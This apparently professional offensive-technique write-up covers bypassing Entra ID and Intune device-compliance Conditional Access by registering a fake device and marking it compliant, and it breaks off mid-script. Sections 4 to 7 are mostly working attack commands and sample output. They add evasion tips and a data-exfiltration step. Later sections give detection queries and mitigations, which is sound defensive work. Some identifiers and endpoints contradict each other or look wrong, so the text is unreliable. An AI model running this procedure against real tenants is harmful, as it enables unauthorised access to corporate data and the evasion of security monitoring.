# [REALWORLD-041]: Device Compliance Policy Bypass

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-041 |
| **MITRE ATT&CK v18.1** | [T1548 - Abuse Elevation Control Mechanisms](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID / M365 |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | All Entra ID versions, Intune all versions |
| **Patched In** | N/A (By Design - Microsoft assessed as non-issue) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Adversaries can circumvent Conditional Access (CA) policies that mandate device compliance by leveraging Intune enrollment exemptions. The Intune Portal client ID (used during device enrollment) can be abused to obtain access tokens that bypass compliance checks. This attack exploits a fundamental design flaw in Azure AD/Entra ID where devices undergoing enrollment are exempt from compliance requirements—a deliberate exception to prevent the chicken-and-egg problem of requiring a compliant device before enrollment completes. However, attackers can weaponize this exemption by generating fictitious devices with the enrollment flow, then making them appear compliant to bypass critical security controls.

**Attack Surface:** Conditional Access policies enforcing "Require device to be marked as compliant," Intune enrollment endpoints, Azure AD device registration API, Entra ID authentication flows.

**Business Impact:** **Complete circumvention of device compliance requirements, granting unauthorized access to sensitive applications and data.** An attacker can access corporate resources that should only be available on managed, compliant devices, potentially leading to data exfiltration, lateral movement, and unauthorized administrative access.

**Technical Context:** The attack typically executes in under 2 minutes once valid user credentials are obtained. Detection is low because the device appears legitimate in Azure AD and authentication logs show normal OAuth flows. The technique leaves minimal forensic artifacts if the fake device is cleaned up afterward.

### Operational Risk
- **Execution Risk:** High - Requires compromised user credentials with Entra ID access, but no special privileges
- **Stealth:** Medium - Creates new device object in Azure AD (potentially detectable), but OAuth flow appears normal
- **Reversibility:** Yes - The fake device can be removed, but access tokens remain valid for their lifetime

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Azure 1.2.3 | Ensure that Conditional Access policies are enforced |
| **DISA STIG** | V-251319 | Azure AD device compliance must be enforced |
| **NIST 800-53** | AC-3 | Access enforcement mechanisms must not be bypassable |
| **NIST 800-53** | CM-5 | Access restrictions for policy changes |
| **GDPR** | Art. 32 | Security of processing - technical and organizational measures |
| **DORA** | Art. 9 | Protection and prevention of operational resilience risks |
| **NIS2** | Art. 21 | Cyber risk management measures must include device controls |
| **ISO 27001** | A.9.2.3 | Management of privileged access rights |
| **ISO 27005** | Risk scenario | Compromise of identity and access control plane |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** 
- Valid user credentials (any cloud-synchronized user account)
- Access to Entra ID from internet-accessible endpoint

**Required Access:** 
- Network connectivity to login.microsoftonline.com and Entra ID endpoints
- No MFA bypass needed (Intune enrollment client is pre-authorized)

**Supported Versions:**
- **Entra ID:** All versions (hybrid, cloud-native, B2B scenarios)
- **Intune:** All versions
- **Affected Tenants:** Any tenant with Conditional Access policies

**Tools:**
- [AADInternals](https://aadinternals.com/) (Version 0.4.2+) - Entra ID exploitation toolkit
- [ROADrecon](https://github.com/dirkjanm/ROADtools) (ROADrecon, ROADtoken) - Azure AD reconnaissance and token manipulation
- PowerShell 5.0+ (native Azure AD module or Microsoft Graph)
- [PCEntraDeviceComplianceBypass](https://github.com/zh21/PCEntraDeviceComplianceBypass) - Proof-of-Concept exploit

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Identify Conditional Access Policies Requiring Device Compliance

**Objective:** Discover which CA policies are enforcing device compliance checks that can be bypassed.

**Command (Microsoft Graph API - PowerShell):**
```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Policy.Read.All"

# Retrieve all Conditional Access policies
$policies = Get-MgBetaIdentityConditionalAccessPolicy

# Filter policies requiring device compliance
foreach ($policy in $policies) {
    if ($policy.GrantControls.BuiltInControls -contains "compliantDevice") {
        Write-Host "Policy: $($policy.DisplayName)"
        Write-Host "Condition: Requires compliant device"
        Write-Host "Includes Apps: $($policy.Conditions.Applications.IncludeApplications)"
        Write-Host "---"
    }
}
```

**What to Look For:**
- Policies with `GrantControls.BuiltInControls` containing "compliantDevice" or "compliantApplication"
- Applications in scope (e.g., Microsoft Teams, SharePoint, Office 365, specific LOB apps)
- User/group assignments (determines target scope)

**Command (Azure Portal UI Alternative):**
```
1. Navigate to Azure Portal → Entra ID → Security → Conditional Access
2. Review each policy's name and click to view details
3. In "Grant" section, look for "Require device to be marked as compliant"
4. Note the assigned Users/Groups and Cloud apps/actions
```

### Step 2: Check If User Account Is Cloud-Synchronized

**Objective:** Verify that the target user is capable of authenticating to Entra ID (not on-premises only).

**Command (PowerShell - Check User Sync Status):**
```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "User.Read.All"

# Check user's DirSyncEnabled and source
$user = Get-MgUser -Filter "userPrincipalName eq 'target@contoso.com'"

if ($user.ExternalUserState -eq $null) {
    Write-Host "User is cloud-native or synchronized"
    Write-Host "DirSyncEnabled: $($user | Select-Object @{Name='IsSynced'; Expression={$_.OnPremisesSyncEnabled}})"
}
```

**What to Look For:**
- User should be synchronized to Entra ID (hybrid) or cloud-native
- No "Synced from on-premises only" restriction

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using AADInternals (Automated PowerShell Method)

**Supported Versions:** Entra ID all versions, Intune all versions

#### Step 1: Install AADInternals Module

**Objective:** Install the AADInternals exploitation framework which contains pre-built functions for device compliance bypass.

**Command:**
```powershell
# Install AADInternals from PowerShell Gallery
Install-Module -Name AADInternals -Force

# Import the module
Import-Module AADInternals

# Verify installation
Get-Command -Module AADInternals | Where-Object {$_.Name -like "*Device*" -or $_.Name -like "*Compliance*"}
```

**Expected Output:**
```
CommandType     Name                              ModuleName
-----------     ----                              ----------
Function        Get-AADIntAccessTokenForAADJoin   AADInternals
Function        Join-AADIntDeviceToAzureAD        AADInternals
Function        Set-AADIntDeviceCompliance        AADInternals
Function        New-AADIntDevice                  AADInternals
```

**What This Means:**
- AADInternals successfully installed and device-related functions are available
- Environment is ready for device enrollment exploitation

**OpSec & Evasion:**
- Install on a system with internet access but separate from corporate network
- PowerShell ExecutionPolicy may need to be adjusted: `Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser`
- Clear PowerShell history afterward: `Clear-History`
- Remove the AADInternals module after use: `Uninstall-Module AADInternals`

**Troubleshooting:**
- **Error:** "Module AADInternals not found"
  - **Cause:** Module not installed in PSModulePath
  - **Fix:** Run `Install-Module AADInternals -Force` as administrator

#### Step 2: Obtain Access Token for Device Enrollment

**Objective:** Acquire an access token that has permissions to register devices in Azure AD using the Intune Portal client ID.

**Command:**
```powershell
# Get access token for AAD device join (uses Intune Portal client ID)
Get-AADIntAccessTokenForAADJoin -SaveToCache

# The token is saved to cache for subsequent commands
# Expected output shows token details
```

**Expected Output:**
```
access_token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IkhIUEJVN3A0REVEM0p3VjhTQnpXaUpzQUIzTSJ9...
expires_in: 3599
token_type: Bearer
refresh_token: 0.AR8AkIjE3Jk...
```

**What This Means:**
- Valid access token obtained from AAD with `03bfbf7f-dbbe-4221-8d27-8cc853ca5deb` (Intune Portal client ID) scope
- Token has permissions to register devices (scope: `https://graph.microsoft.com/.default`)
- Token is cached locally for subsequent API calls

**OpSec & Evasion:**
- Access token acquisition generates minimal logs (normal Entra ID authentication)
- The Intune client ID is legitimate and pre-authorized by Microsoft
- Detection likelihood: Low - appears as normal user login

**References & Proofs:**
- [AADInternals Get-AADIntAccessTokenForAADJoin](https://aadinternals.com/post/mdm/)
- [Microsoft Entra ID authentication flow documentation](https://learn.microsoft.com/en-us/entra/identity-platform/msal-authentication-flows)
- [Intune Portal Client ID](https://github.com/aadinternals/aadinternals.github.io/blob/master/blog/_posts/2024-09-10-mdm.md)

#### Step 3: Register a Fictitious Device to Azure AD

**Objective:** Create a fake device object in Azure AD that appears as a legitimate managed device.

**Command:**
```powershell
# Register a fake device (e.g., posing as a Windows 10 machine)
$deviceName = "FABRICATED-DEVICE-001"
$deviceType = "Commodore"  # Device type shown in Azure AD
$osVersion = "C64"          # OS version shown in Azure AD

Join-AADIntDeviceToAzureAD -DeviceName $deviceName -DeviceType $deviceType -OSVersion $osVersion

# The device certificate is saved to the current directory
```

**Expected Output:**
```
Device successfully registered to Azure AD:
DisplayName: "FABRICATED-DEVICE-001"
DeviceId: d03994c9-24f8-41ba-a156-1805998d6dc7
Cert thumbprint: 78CC77315A100089CF794EE49670552485DE3689
Cert file name: "d03994c9-24f8-41ba-a156-1805998d6dc7.pfx"
```

**What This Means:**
- Device is now visible in Azure AD under Devices → All devices
- Device has a valid certificate for authentication
- Certificate file (.pfx) is saved locally for later device auth
- Device **is not yet marked as compliant** (next step)

**OpSec & Evasion:**
- Device creation generates AuditLog event: "Register device" (trackable but common in onboarding)
- Device name should resemble legitimate devices in your environment (e.g., "LAPTOP-ABC123" instead of "FABRICATED")
- Device certificate contains real thumbprint but is created on the fly
- Detection likelihood: Medium - New device registration is auditable

**Troubleshooting:**
- **Error:** "Cannot register device - insufficient permissions"
  - **Cause:** Access token doesn't have device registration permission
  - **Fix:** Ensure token was obtained with `Get-AADIntAccessTokenForAADJoin`

#### Step 4: Mark the Device as Compliant

**Objective:** Set device compliance attributes so Conditional Access policies recognize it as compliant.

**Command:**
```powershell
# Get the device we just created
$deviceId = "d03994c9-24f8-41ba-a156-1805998d6dc7"

# Mark it as compliant
Set-AADIntDeviceCompliance -DeviceId $deviceId -IsCompliant $true

# Alternatively, set device as Intune-managed
Set-AADIntDeviceCompliance -DeviceId $deviceId -ManagementType "Intune"
```

**Expected Output:**
```
Device compliance updated successfully
DeviceId: d03994c9-24f8-41ba-a156-1805998d6dc7
Compliance Status: Compliant
Trust Type: Azure AD registered
```

**What This Means:**
- Device now has `isCompliant: true` attribute in Azure AD
- Conditional Access policies will recognize this device as meeting compliance requirements
- Device appears legitimate in CA policy evaluation

**OpSec & Evasion:**
- Compliance update generates minimal logging (no specific audit event for compliance state change)
- CA policy re-evaluation happens in real-time
- Detection likelihood: Low - No specific alerts for device compliance changes

**References & Proofs:**
- [AADInternals Set-AADIntDeviceCompliance](https://aadinternals.com/post/mdm/)
- [Azure AD Device Compliance Properties](https://learn.microsoft.com/en-us/entra/identity/devices/concept-device-registration)

#### Step 5: Authenticate Using the Fake Compliant Device

**Objective:** Use the fake compliant device to obtain an access token that bypasses Conditional Access policies.

**Command:**
```powershell
# Use the device certificate to get a token as if authenticating from the compliant device
$deviceCertPath = "d03994c9-24f8-41ba-a156-1805998d6dc7.pfx"
$deviceId = "d03994c9-24f8-41ba-a156-1805998d6dc7"

# Get token using the device certificate
$token = Get-AADIntAccessTokenWithDeviceCertificate -DeviceCertificatePath $deviceCertPath -ApplicationId "1b730954-1685-4b74-9bfd-dac224daaffc" # Microsoft Teams client ID

# Or for Microsoft Graph to access broader resources
$graphToken = Get-AADIntAccessTokenWithDeviceCertificate -DeviceCertificatePath $deviceCertPath -ApplicationId "00000003-0000-0000-c000-000000000000" # Microsoft Graph
```

**Expected Output:**
```
access_token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImhzTW1XaEQ1QVhjMmdnNFVHMmJqWEd2TVEzQlUifQ...
token_type: Bearer
expires_in: 3600
device_id: d03994c9-24f8-41ba-a156-1805998d6dc7
is_compliant: true
```

**What This Means:**
- Token issued with device claim showing the fake device
- Conditional Access policy evaluates: "Device from compliant device ID → PASS"
- User now has access to resources restricted by compliance-based CA policies
- Token is valid for 1 hour (typical Entra ID token lifetime)

**OpSec & Evasion:**
- Token acquisition uses device certificate (not user password)
- Device authentication appears legitimate (uses device cert previously registered)
- Sign-in logs may show unusual device ID if not cleaned up promptly
- Detection likelihood: Medium-High if device is left in Azure AD (unusual device names/OS versions stand out)

#### Step 6: Access Protected Resources and Exfiltrate Data

**Objective:** Use the bypass token to access applications that were previously blocked by Conditional Access.

**Command:**
```powershell
# Use the token to access Microsoft Teams
$headers = @{
    "Authorization" = "Bearer $graphToken"
    "Content-Type"   = "application/json"
}

# List all Teams the user has access to
$teams = Invoke-RestMethod -Method Get -Uri "https://graph.microsoft.com/v1.0/me/joinedTeams" -Headers $headers

# Download files from Teams/SharePoint
foreach ($team in $teams) {
    $siteId = $team.resourceProvisioningOptions | Where-Object {$_ -eq "Team"}
    Write-Host "Accessing Team: $($team.displayName)"
    # Further exfiltration via Microsoft Graph APIs
}
```

**What This Means:**
- Attacker can now access Teams, SharePoint, OneDrive, and other M365 resources
- Conditional Access no longer blocks access based on device compliance
- Data can be exfiltrated via standard Microsoft Graph APIs

**Troubleshooting:**
- **Error:** "Token expired"
  - **Cause:** Token lifetime exceeded (default 1 hour)
  - **Fix:** Re-run Step 5 to obtain fresh token
- **Error:** "Insufficient permissions"
  - **Cause:** Application ID doesn't have required scope for target resource
  - **Fix:** Use appropriate application ID (Teams, Graph, Exchange, etc.)

---

### METHOD 2: Using PCEntraDeviceComplianceBypass POC (Direct PowerShell)

**Supported Versions:** Entra ID all versions, Intune all versions

#### Step 1: Download and Configure POC Script

**Objective:** Set up the publicly available proof-of-concept exploit script.

**Command:**
```powershell
# Clone the POC repository
git clone https://github.com/zh21/PCEntraDeviceComplianceBypass.git
cd PCEntraDeviceComplianceBypass

# Review the main script
Get-Content .\Invoke-ComplianceBypass.ps1

# Note the following parameters to customize:
# -TenantId: Target Azure AD tenant ID
# -Username: Target user email
# -DeviceDisplayName: Name for fake device
# -TargetApplication: App to access (Teams, SharePoint, etc.)
```

**Expected Output:**
Script shows customizable parameters for:
- `$TenantId` = "contoso.onmicrosoft.com"
- `$ClientId` = "04b07795-8ddb-461a-bbee-02f9e1bf7b46" (Intune Portal)
- `$RedirectUri` = "https://login.microsoftonline.com/common/oauth2/nativeclient"

**What This Means:**
- POC is pre-configured with known working parameters
- Only customization needed is TenantId and target user

**OpSec & Evasion:**
- Downloaded script may be flagged by endpoint security
- Ensure script is downloaded on non-corporate network
- Consider obfuscating script before execution

#### Step 2: Execute the Bypass

**Objective:** Run the POC to automatically create a compliant device and obtain access token.

**Command:**
```powershell
# Run the bypass script with custom parameters
.\Invoke-ComplianceBypass.ps1 -TenantId "contoso.onmicrosoft.com" `
    -Username "user@contoso.com" `
    -DeviceDisplayName "EMPLOYEE-WORKSTATION-001" `
    -TargetApplication "Microsoft.Teams" `
    -Verbose

# Script will:
# 1. Prompt for user credentials
# 2. Obtain Intune Portal access token
# 3. Register fake device to Azure AD
# 4. Mark device as compliant
# 5. Get access token from fake compliant device
# 6. Return token for use with target application
```

**Expected Output:**
```
[*] Attempting to bypass Conditional Access policy...
[+] Access token obtained: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiI...
[+] Device successfully registered with ID: d03994c9-24f8-41ba-a156-1805998d6dc7
[+] Device marked as compliant
[+] Access token valid for Teams granted
[+] User can now access Teams without compliant device requirement
```

**What This Means:**
- All steps automated in single command
- Reduced operator error risk
- Direct access token for target application obtained

#### Step 3: Use Token to Access Protected Resources

**Objective:** Leverage the token to access restricted resources.

**Command:**
```powershell
# If output includes a Teams access token, use it immediately
$teamsToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiI..."

# Access Teams via web API
$headers = @{"Authorization" = "Bearer $teamsToken"}

# Export Teams messages (if access to compliance features)
Invoke-RestMethod -Method Get -Uri "https://teams.microsoft.com/api/canberra/v1/conversations" `
    -Headers $headers | ConvertTo-Json | Out-File teams-data.json
```

---

### METHOD 3: Manual Method Using ROADtools and ROADtoken (Linux/Advanced)

**Supported Versions:** Entra ID all versions

#### Step 1: Install ROADtools

**Objective:** Install the cross-platform Azure AD enumeration and token manipulation toolkit.

**Command (Linux/macOS):**
```bash
# Install ROADtools from GitHub
git clone https://github.com/dirkjanm/ROADtools.git
cd ROADtools
pip3 install -r requirements.txt
python3 -m roadrecon

# Or install via pip
pip3 install roadtools
```

**Command (Windows):**
```powershell
pip install roadtools
roadtoken
```

**Expected Output:**
```
ROADtools v1.2.0
[*] ROADtoken interactive shell
[*] Token cache initialized
```

**What This Means:**
- ROADtools installed and interactive shell available
- Can directly manipulate tokens and interact with Microsoft Graph API

#### Step 2: Obtain Access Token via Device Code Flow

**Objective:** Get access token using ROADtoken with Intune Portal client ID.

**Command:**
```bash
# Start ROADtoken in interactive mode
roadtoken

# Inside ROADtoken shell:
# Use the Intune Portal client ID with device code flow
token_request = {
    'client_id': '04b07795-8ddb-461a-bbee-02f9e1bf7b46',  # Intune Portal
    'scope': 'https://graph.microsoft.com/.default',
    'grant_type': 'urn:ietf:params:oauth:grant-type:device_code'
}

# This will generate a device code for user to authenticate
# Upon user approval, token is obtained
```

#### Step 3: Register Device via Microsoft Graph API

**Objective:** Use Graph API to create device object.

**Command:**
```bash
# In ROADtoken shell, send Graph request to register device
graph_request = {
    'method': 'POST',
    'endpoint': '/deviceAppManagement/windowsAutopilotDeploymentProfiles',
    'body': {
        'displayName': 'FAKE-DEVICE-001',
        'deviceType': 'Windows10',
        'roleScopeTagIds': []
    }
}

send_graph_request(graph_request)
```

**OpSec & Evasion:**
- ROADtools is legitimate security research tool
- May be flagged as suspicious by endpoint protection
- Consider running on isolated lab environment

---

## 6. ATTACK SIMULATION & VERIFICATION

**Note:** No formal Atomic Red Team test exists for this cloud-specific technique. However, security teams can create custom tests:

### Manual Verification Test

**Objective:** Test if Conditional Access policies can be bypassed in your environment.

**Test Steps:**

1. **Create a test Conditional Access policy:**
   ```
   Azure Portal → Entra ID → Security → Conditional Access → New Policy
   - Name: "Test Compliance Bypass Detection"
   - Users: All users (or specific test group)
   - Cloud apps: Microsoft Teams
   - Grant: Require device to be marked as compliant
   - Enable: On
   ```

2. **Attempt bypass with test credentials:**
   ```powershell
   # Use AADInternals method from METHOD 1 above
   # If successful, device appears in Azure AD and access is granted
   # Expected result: Access to Teams despite "no compliant device"
   ```

3. **Verify detection:**
   ```
   Check audit logs for:
   - New device registration
   - Device compliance state change
   - Token issued for device-based access
   ```

---

## 7. TOOLS & COMMANDS REFERENCE

### [AADInternals](https://aadinternals.com/)

**Version:** 0.4.2+
**Minimum Version:** 0.4.0 (earlier versions lack device compliance functions)
**Supported Platforms:** Windows (PowerShell 5.0+), cross-platform (PowerShell 7+)

**Installation:**
```powershell
Install-Module AADInternals -Force
Import-Module AADInternals
```

**Key Functions for This Technique:**
```powershell
Get-AADIntAccessTokenForAADJoin          # Obtain enrollment token
Join-AADIntDeviceToAzureAD               # Register fake device
Set-AADIntDeviceCompliance               # Mark device as compliant
Get-AADIntAccessTokenWithDeviceCertificate # Get token as fake device
```

### [ROADtools](https://github.com/dirkjanm/ROADtools)

**Version:** 1.2.0+
**Supported Platforms:** Windows, Linux, macOS
**Installation:**
```bash
pip install roadtools
roadtoken --help
```

**Key Commands:**
```bash
roadtoken auth -u username@tenant.onmicrosoft.com  # Authenticate
roadtoken scope -s https://graph.microsoft.com/.default  # Set scope
roadtoken request POST /api/Device -d '{device json}'  # Create device
```

### [PCEntraDeviceComplianceBypass](https://github.com/zh21/PCEntraDeviceComplianceBypass)

**Version:** Latest from GitHub
**Supported Platforms:** Windows PowerShell 5.0+
**Installation:**
```powershell
git clone https://github.com/zh21/PCEntraDeviceComplianceBypass
cd PCEntraDeviceComplianceBypass
.\Invoke-ComplianceBypass.ps1
```

### PowerShell One-Liner (Simplified POC)

```powershell
$token = Get-AADIntAccessTokenForAADJoin -SaveToCache; Join-AADIntDeviceToAzureAD -DeviceName "WORKSTATION-TEST" -DeviceType "Windows10" -OSVersion "22H2"; Set-AADIntDeviceCompliance -DeviceId (Get-AADIntDeviceId) -IsCompliant $true
```

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Device Registration with Compliance Bypass Indicators

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources, properties
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Azure AD all versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("Register device", "Update device")
| where tostring(InitiatedBy.user.userPrincipalName) has "@"
| extend DeviceData = parse_json(tostring(TargetResources[0]))
| where DeviceData.displayName matches regex @"^(FABRICATED|FAKE|TEST|BYPASS|COMMOD|C64)"
    or DeviceData.operatingSystem matches regex @"^(C64|Commodore|FAKE)"
| project TimeGenerated, InitiatedBy, OperationName, DeviceData.displayName, DeviceData.operatingSystem, DeviceData.deviceId
| summarize Count=count() by InitiatedBy, tostring(DeviceData.displayName)
```

**What This Detects:**
- New device registrations with suspicious naming patterns (fake device names)
- Device type or OS showing non-existent systems (Commodore C64, etc.)
- Multiple device registrations in short timeframe from single user

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious Device Compliance Bypass Attempt`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

**False Positive Analysis:**
- **Legitimate Activity:** Bulk device enrollment from MDM system, pilot device registrations
- **Tuning:** Exclude known enrollment accounts: `| where InitiatedBy.user.userPrincipalName !startswith "svc_intune"`

### Query 2: Conditional Access Bypass - Device Compliance State Change

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources, properties
- **Alert Severity:** Critical
- **Frequency:** Run every 1 minute
- **Applies To Versions:** Azure AD all versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Update device"
| extend DeviceProperties = parse_json(tostring(TargetResources[0].modifiedProperties))
| where DeviceProperties contains "isCompliant" and DeviceProperties contains "true"
| extend InitiatorUPN = tostring(InitiatedBy.user.userPrincipalName)
| extend InitiatorAppId = tostring(InitiatedBy.app.appId)
| where InitiatorAppId == "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  // Intune Portal client ID
| project TimeGenerated, InitiatorUPN, TargetResources, OperationName
```

**What This Detects:**
- Device compliance state change to "compliant" performed by Intune Portal app
- Indicates device is being manipulated to appear compliant
- Combined with device registration events = high-confidence bypass attempt

---

## 9. WINDOWS EVENT LOG MONITORING

**Note:** Limited event logging for this attack due to cloud-only nature. Focus on Entra ID audit logs (handled in Section 8). However, if the fake device attempts to authenticate from on-premises AD Connect server, Windows Security Event 4724 may be generated.

**Event ID: 4724 (Attempt to Reset Account Password)**
- **Log Source:** Security
- **When Generated:** If fake device attempts password reset on synchronized account
- **Filter:** Account name = target user, Caller Computer Name = AAD Connect server

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Account Management → Audit User Account Management**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on domain controllers

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious device registered with Intune client token"
- **Severity:** Critical
- **Description:** Device was registered to Azure AD using known Intune Portal client ID with atypical device characteristics
- **Applies To:** All subscriptions with Defender for Identity enabled
- **Remediation:** 
  - Investigate device registration in Azure AD
  - Verify device name matches organizational naming convention
  - Delete suspicious device if not recognized
  - Review user's recent authentication activity

**Alert Name:** "Unusual device compliance state change"
- **Severity:** High
- **Description:** Device compliance status changed from non-compliant to compliant without MDM enrollment activity
- **Applies To:** All subscriptions with Defender for Cloud enabled
- **Remediation:**
  - Verify device is actually Intune-enrolled via Intune admin center
  - Check if device is real or virtual
  - Review device certificate details

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Identity**: ON
   - **Defender for Cloud Apps**: ON
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

---

## 11. SPLUNK DETECTION RULES

### Rule 1: Device Registration via Intune Portal Client ID

**Rule Configuration:**
- **Required Index:** azure_activity
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** operationName, initiatedBy.app.appId, properties
- **Alert Threshold:** > 0 events in 5 mins
- **Applies To Versions:** All Azure AD versions

**SPL Query:**
```
index=azure_activity operationName="Register device"
  initiatedBy.app.appId="04b07795-8ddb-461a-bbee-02f9e1bf7b46"
  properties.displayName="FABRICATED*" OR properties.displayName="FAKE*" OR properties.operatingSystem="C64"
| stats count by initiatedBy.user.userPrincipalName, properties.displayName, properties.deviceId
| where count >= 1
```

**What This Detects:**
- Device registration event initiated by Intune Portal client
- Device name matches suspicious patterns
- Suspicious OS versions

**Source:** Internal Splunk detection based on AzureActivity data schema

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Require MFA for Device Enrollment**
- Even if device enrollment is exempt from compliance requirements, MFA should be enforced
- This prevents attackers from using weak or stolen credentials
- **Applies To Versions:** All Entra ID versions

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Enforce MFA for Device Enrollment`
4. **Users:** All users
5. **Cloud apps:** Microsoft Intune, Intune Enrollment
6. **Conditions:** 
   - Application scope: Device Enrollment
7. **Access controls:**
   - Grant: **Require multifactor authentication**
8. Enable policy: **On**
9. Click **Create**

**Verification Command:**
```powershell
# Verify MFA is required for Intune enrollment
$policy = Get-MgBetaIdentityConditionalAccessPolicy -Filter "displayName eq 'Enforce MFA for Device Enrollment'"
$policy.GrantControls.BuiltInControls | Should -Contain "mfa"
```

**Action 2: Block Legacy Authentication Protocols**
- Prevent NTLM and other legacy auth that might bypass modern controls
- Modern attacks use OAuth flows, but legacy protocols increase surface area

**Manual Steps (Azure Portal):**
1. Navigate to **Entra ID** → **Security** → **Conditional Access** → **New policy**
2. **Name:** `Block Legacy Authentication`
3. **Users:** All users
4. **Cloud apps:** All cloud apps
5. **Conditions:**
   - Client apps: **Exchange ActiveSync**, **Other clients**
6. **Access controls:**
   - Grant: **Block access**
7. Enable policy: **On**

**Action 3: Restrict Device Registration to Approved Users Only**
- Limit who can enroll/register devices via RBAC

**Manual Steps (Azure Portal):**
1. Navigate to **Entra ID** → **Roles and administrators**
2. Search for **Cloud Device Administrator**
3. Click **Add assignments**
4. Select only authorized IT staff
5. Repeat for **Intune Administrator** and **Windows 365 Cloud PC Administrator**

**Manual Steps (PowerShell):**
```powershell
# Remove Device Registration permissions from non-IT users
$policy = Get-MgBetaIdentityConditionalAccessPolicy -Filter "displayName eq 'Device Registration Policy'"

# Set assignment to exclude regular users
$policy.Conditions.Users.ExcludeUsers += @("group-guid-of-non-it-users")
Update-MgBetaIdentityConditionalAccessPolicy -IdentityConditionalAccessPolicyId $policy.Id -BodyParameter $policy
```

### Priority 2: HIGH

**Action 1: Implement Microsoft Entra Verified ID (Passwordless)**
- Reduce reliance on passwords which can be compromised
- Passwordless sign-in is harder to spoof with fake devices

**Manual Steps:**
1. **Entra ID** → **Manage** → **Passwordless sign-in** → **Windows Hello for Business**
2. Enable **Windows Hello for Business** deployment
3. Configure via Group Policy or Intune

**Action 2: Enable Risk-Based Conditional Access**
- Use Entra ID Identity Protection to detect anomalies
- Fake device from new location/impossible travel = high risk

**Manual Steps:**
1. **Entra ID** → **Security** → **Conditional Access** → **New policy**
2. **Name:** `Block High-Risk Sign-Ins`
3. **Conditions:**
   - User risk: **High**
   - Sign-in risk: **High**
4. **Access controls:**
   - Grant: **Block access** OR **Require MFA + Compliant Device**
5. Enable: **On**

**Action 3: Monitor Device Registration Activity**
- Set alerts for any device registration (especially with suspicious characteristics)
- Weekly review of device inventory

**Manual Steps:**
1. **Entra ID** → **Audit logs**
2. Filter: **OperationName = "Register device"**
3. Export to CSV and review weekly
4. Delete unrecognized devices immediately

### Priority 3: MEDIUM

**Action 1: Enforce Device Compliance Hardening**
- Require devices to have specific security posture (Windows Defender enabled, etc.)
- Makes fake device harder to make appear compliant

**Manual Steps (Intune):**
1. **Intune** → **Devices** → **Compliance policies**
2. **Create policy:**
   - Device Compliance Policy (Windows 10/11)
   - Require: Windows Defender enabled, Secure Boot enabled, Encryption enabled
3. Assign to All devices
4. Monitor compliance reports

**Action 2: Audit Device Registrations Weekly**
- Review all device registrations for suspicious patterns

**PowerShell Script:**
```powershell
# Export all devices registered in last 7 days
Get-MgDevice -Filter "approximateLastSignInDateTime gt " | Where-Object {
    $_.ApproximateLastSignInDateTime -gt (Get-Date).AddDays(-7)
} | Select-Object DisplayName, DeviceId, OS, IsCompliant, DeviceOSVersion | Export-Csv -Path "device-audit.csv"
```

**Action 3: Implement Device-Based Conditional Access Policies**
- In addition to compliance, require specific device ownership (hybrid join, etc.)

**Manual Steps (Azure Portal):**
1. **Entra ID** → **Conditional Access** → **New policy**
2. **Name:** `Device Ownership Requirement`
3. **Conditions:**
   - Device filter: Include `device.trustType eq "AzureAD" OR device.trustType eq "Hybrid"`
4. Grant: **Allow access**
5. This ensures device must be Azure AD or Hybrid joined, not just "registered"

### Validation Command (Verify Mitigations)

```powershell
# Check if all mitigations are in place
$criticalTests = @(
    @{Name="MFA on Enrollment"; Query="Get-MgBetaIdentityConditionalAccessPolicy | Where {$_.DisplayName -like '*MFA*Enrollment'}"},
    @{Name="Legacy Auth Blocked"; Query="Get-MgBetaIdentityConditionalAccessPolicy | Where {$_.DisplayName -like '*Legacy*'}"},
